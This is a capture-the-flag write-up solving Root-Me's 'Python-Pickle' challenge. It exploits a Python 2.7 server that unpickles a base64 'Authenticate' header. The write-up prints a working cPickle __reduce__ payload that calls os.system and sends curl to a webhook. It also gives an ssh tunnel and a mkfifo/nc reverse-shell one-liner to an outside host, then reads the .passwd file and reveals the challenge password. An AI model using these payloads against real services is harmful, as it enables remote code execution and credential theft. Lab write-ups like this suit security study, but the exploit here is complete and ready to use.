---
layout: default
title: Python-Pickle
---
In this challenge we only get this URL: `http://challenge02.root-me.org:60005/`.
This is the first request:

![[Pasted image 20260311154154.png]]

We can see this is `BaseHTTP` server, running on `Python/2.7.7`.
It says we need to first `AUTH`, since this is upper letters, I guess this meant to be the http method:
![[Pasted image 20260311154314.png]]

Now, we got `unknown user group: /`, remember we've been told we need to authenticate as `admin`. Let's try give it instead of `/`, rather `admin`:

![[Pasted image 20260311154418.png]]

Now, it says: `Can't find 'Authenticate' header`, let's add this header:

![[Pasted image 20260311154459.png]]

We got as response this error message:
```
Authentication failed = Traceback (most recent call last):\n  File \"/challenge/app-script/ch5/ch5\", line 52, in do_AUTH\n    authcombi = pickle.loads(base64.b64decode(self.headers.getheader('Authenticate')))\n  File \"/usr/lib/python2.7/base64.py\", line 78, in b64decode\n    raise TypeError(msg)\nTypeError: Incorrect padding\n
```

Okay, it decodes in the base64 string we give it, and then loads it using pickle. Remember this is `python2.7.17`, you might need to install this python on your machine:

```
sudo apt install python2.7
```

We can achieve pickling attack using this snippet, I gave here in the command `curl` to my webhook, to see it works:

```python
import cPickle
import base64
import os

cmd = "curl https://webhook.site/3c79c2fa-2cb9-4a75-9f58-7b4a906afe13"

class Exploit(object):
	def __reduce__(self):
		return (os.system, ((cmd),))

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

Let's create our pickle, and copy it for sending:
```bash
┌──(me㉿PC4)-[~/App-Script/pickle]
└─$ python2.7 exploit.py

┌──(me㉿PC4)-[~/App-Script/pickle]
└─$ cat exploit.pickle | base64 -w0 | xclip -sel clip
```

Now, send the pickle:

![[Pasted image 20260311154950.png]]

I checked the webhook, to verify we got the request from the server:

![[Pasted image 20260311155008.png]]

Okay, now spawn reverse shell. I'm using [https://pinggy.io/](https://pinggy.io/) to create port tunneling:
```bash
ssh -p 443 -R0:127.0.0.1:1337 tcp@free.pinggy.io
```

![[Pasted image 20260311155136.png]]

The full new hostname and port: `tcp://omtuv-164-138-117-211.a.free.pinggy.link:35321`
Now, create the reverse shell payload using [https://www.revshells.com/](https://www.revshells.com/):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc omtuv-164-138-117-211.a.free.pinggy.link 35321 >/tmp/f
```

set up the local listener:
```bash
nc -nvlp 1337
```

and send the encoded pickle payload:
![[Pasted image 20260311155513.png]]

We got the reverse shell:

![[Pasted image 20260311155540.png]]

Let's read the password:
```bash
app-script-ch5-cracked@challenge02:/challenge/app-script/ch5$ cat /challenge/app-script/ch5/.passwd
6kSGEI2bh8bgRfCW
```

So the password is **6kSGEI2bh8bgRfCW**